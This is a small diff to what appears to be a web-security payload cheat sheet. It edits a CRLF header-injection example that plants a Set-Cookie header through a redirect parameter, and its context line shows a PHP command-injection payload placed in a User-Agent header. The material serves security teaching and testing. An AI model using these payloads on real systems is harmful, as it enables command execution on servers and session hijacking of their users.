@@ -127,12 +127,12 @@ User-Agent: Mozilla <?php passthru('bin/ls');?>    // cmd injection #3
 Inject header + CRLF: Set your own cookies example
 ```http
 // Request with Carriage-Return Line-Feed '%0d%0a'
-example.org/redirect.asp?origin=foo%0d%0aSet-Cookie:%20ASPSESSIONID=SessionValue%0d%0a
+example.org/redirect.asp?origin=foo%0d%0aSet-Cookie:%20session_name=setsessionidvalue%0d%0a
 
 // Response
 HTTP/1.1 302 Object moved
 Location: account.asp?origin=foo
-Set-Cookie: ASPSESSIONID=SessionValue
+Set-Cookie: session_name=setsessionidvalue
 Content-Length: 121
 ```
 
